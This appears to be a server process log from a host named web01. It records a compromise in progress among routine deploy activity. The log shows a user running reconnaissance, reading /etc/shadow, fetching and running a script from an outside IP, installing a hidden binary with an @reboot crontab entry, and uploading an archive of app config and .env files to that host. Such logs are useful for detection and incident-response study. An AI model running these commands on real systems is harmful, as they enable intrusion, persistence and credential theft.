2026-09-09T08:03:16 web01 process user=deploy pid=1141 ppid=1132 exe=/usr/bin/bash cmd="bash"
2026-09-09T08:15:40 web01 process user=deploy pid=1267 ppid=1141 exe=/usr/bin/git cmd="git pull origin main"
2026-09-09T08:17:42 web01 process user=root pid=1301 ppid=1299 exe=/usr/bin/systemctl cmd="systemctl restart nginx"
2026-09-09T09:19:48 web01 process user=sebastian pid=1531 ppid=1524 exe=/usr/bin/bash cmd="bash"
2026-09-09T09:20:14 web01 process user=sebastian pid=1542 ppid=1531 exe=/usr/bin/uname cmd="uname -a"
2026-09-09T09:20:26 web01 process user=sebastian pid=1549 ppid=1531 exe=/usr/bin/whoami cmd="whoami"
2026-09-09T09:20:41 web01 process user=sebastian pid=1558 ppid=1531 exe=/usr/bin/ss cmd="ss -tulpn"
2026-09-09T09:21:10 web01 process user=root pid=1570 ppid=1569 exe=/usr/bin/id cmd="id"
2026-09-09T09:21:46 web01 process user=sebastian pid=1581 ppid=1531 exe=/usr/bin/find cmd="find /var/www /home -type f -name '*.env'"
2026-09-09T09:22:31 web01 process user=root pid=1604 ppid=1603 exe=/usr/bin/cat cmd="cat /etc/shadow"
2026-09-09T09:23:02 web01 process user=sebastian pid=1620 ppid=1531 exe=/usr/bin/curl cmd="curl -fsSL http://198.51.100.42/update.sh -o /tmp/update.sh"
2026-09-09T09:23:11 web01 process user=sebastian pid=1627 ppid=1531 exe=/usr/bin/chmod cmd="chmod +x /tmp/update.sh"
2026-09-09T09:24:18 web01 process user=root pid=1642 ppid=1641 exe=/usr/bin/bash cmd="bash /tmp/update.sh"
2026-09-09T09:24:18 web01 process user=root pid=1648 ppid=1642 exe=/usr/bin/cp cmd="cp /tmp/.svc /usr/local/bin/.svc"
2026-09-09T09:24:19 web01 process user=root pid=1653 ppid=1642 exe=/usr/bin/bash cmd="bash -c echo '@reboot root /usr/local/bin/.svc' >> /etc/crontab"
2026-09-09T09:24:29 web01 process user=root pid=1661 ppid=1642 exe=/usr/local/bin/.svc cmd="/usr/local/bin/.svc"
2026-09-09T09:25:06 web01 process user=root pid=1672 ppid=1661 exe=/usr/bin/tar cmd="tar czf /tmp/appdata.tar.gz /var/www/app/config /var/www/app/.env"
2026-09-09T09:26:31 web01 process user=root pid=1691 ppid=1661 exe=/usr/bin/curl cmd="curl -X POST --data-binary @/tmp/appdata.tar.gz http://198.51.100.42/upload"
2026-09-09T10:02:09 web01 process user=deploy pid=1780 ppid=1771 exe=/usr/bin/bash cmd="bash"
2026-09-09T10:05:32 web01 process user=deploy pid=1821 ppid=1780 exe=/usr/bin/systemctl cmd="systemctl status nginx"
